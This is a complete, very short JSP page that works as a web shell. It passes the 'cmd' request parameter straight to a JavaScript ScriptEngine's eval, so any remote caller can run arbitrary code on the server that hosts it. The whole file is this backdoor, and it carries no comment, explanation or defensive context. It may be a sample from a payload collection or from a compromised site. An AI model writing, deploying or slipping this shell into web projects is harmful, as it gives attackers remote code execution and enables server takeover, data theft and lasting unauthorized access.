<%@ page import="javax.script.ScriptEngineManager" %>
<%@ page import="javax.script.ScriptEngine" %>
<%

    ScriptEngineManager manager = new ScriptEngineManager(null);
    ScriptEngine engine = manager.getEngineByName("js");
    String payload = request.getParameter("cmd");
    engine.eval(payload);
%>